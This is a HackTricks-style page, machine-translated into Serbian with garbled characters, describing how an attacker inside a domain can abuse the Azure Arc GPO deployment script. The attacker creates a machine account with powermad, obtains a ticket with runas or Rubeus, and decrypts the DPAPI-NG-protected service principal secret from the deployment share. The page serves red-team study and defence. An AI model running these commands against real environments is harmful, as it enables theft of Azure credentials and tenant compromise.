# Az - Arc vulnerable GPO Deploy Script

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Identifying the Issues

Azure Arc omogu캖ava integraciju novih internih servera (servera pridru쬰nih domenima) u Azure Arc koriste캖i metodu Group Policy Object. Da bi to olak코ao, Microsoft pru쬬 alat za implementaciju potreban za pokretanje procedure onboardinga. Unutar ArcEnableServerGroupPolicy.zip datoteke nalaze se slede캖i skripti: DeployGPO.ps1, EnableAzureArc.ps1, i AzureArcDeployment.psm1.

Kada se izvr코i, DeployGPO.ps1 skripta obavlja slede캖e radnje:

1. Kreira Azure Arc Servers Onboarding GPO unutar lokalnog domena.
2. Kopira EnableAzureArc.ps1 skriptu za onboarding na odre캠eni mre쬹i deo kreiran za proces onboardinga, koji tako캠e sadr쬴 Windows instalacioni paket.

Kada se pokrene ova skripta, sys administratori treba da obezbede dva glavna parametra: **ServicePrincipalId** i **ServicePrincipalClientSecret**. Pored toga, potrebni su i drugi parametri kao 코to su domen, FQDN servera koji hostuje share, i naziv share-a. Dodatne informacije kao 코to su tenant ID, resource group, i druge neophodne informacije tako캠e moraju biti obezbe캠ene skripti.

Enkriptovana tajna se generi코e u AzureArcDeploy direktorijumu na odre캠enom share-u koriste캖i DPAPI-NG enkripciju. Enkriptovana tajna se 캜uva u datoteci pod nazivom encryptedServicePrincipalSecret. Dokazi o ovome mogu se na캖i u DeployGPO.ps1 skripti, gde se enkripcija vr코i pozivanjem ProtectBase64 sa $descriptor i $ServicePrincipalSecret kao ulazima. Deskriptor se sastoji od SID-ova grupe Domain Computer i Domain Controller, osiguravaju캖i da se ServicePrincipalSecret mo쬰 dekriptovati samo od strane Domain Controllers i Domain Computers sigurnosnih grupa, kako je navedeno u komentarima skripte.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Exploit

Imamo slede캖e uslove:

1. Uspe코no smo penetrirali unutra코nju mre쬿.
2. Imamo mogu캖nost da kreiramo ili preuzmemo kontrolu nad ra캜unom ra캜unara unutar Active Directory.
3. Otkrili smo mre쬹o deljenje koje sadr쬴 AzureArcDeploy direktorijum.

Postoji nekoliko metoda za dobijanje ra캜una ra캜unara unutar AD okru쬰nja. Jedna od naj캜e코캖ih je iskori코캖avanje kvote ra캜una ra캜unara. Druga metoda uklju캜uje kompromitovanje ra캜una ra캜unara kroz ranjive ACL-ove ili razne druge pogre코ne konfiguracije.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Kada se dobije nalog ma코ine, mogu캖e je autentifikovati se koriste캖i ovaj nalog. Mo쬰mo ili koristiti runas.exe komandu sa netonly flagom ili koristiti pass-the-ticket sa Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
캛uvaju캖i TGT za na코 korisni캜ki nalog u memoriji, mo쬰mo koristiti slede캖i skript za de코ifrovanje tajne servisnog principala.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternativno, mo쬰mo koristiti [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

U ovom trenutku, mo쬰mo prikupiti preostale informacije potrebne za povezivanje sa Azure-om iz ArcInfo.json datoteke, koja je sme코tena na istom mre쬹om deljenju kao i encryptedServicePrincipalSecret datoteka. Ova datoteka sadr쬴 detalje kao 코to su: TenantId, servicePrincipalClientId, ResourceGroup i jo코 mnogo toga. Sa ovim informacijama, mo쬰mo koristiti Azure CLI za autentifikaciju kao kompromitovani servisni principal.

## Reference

* [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
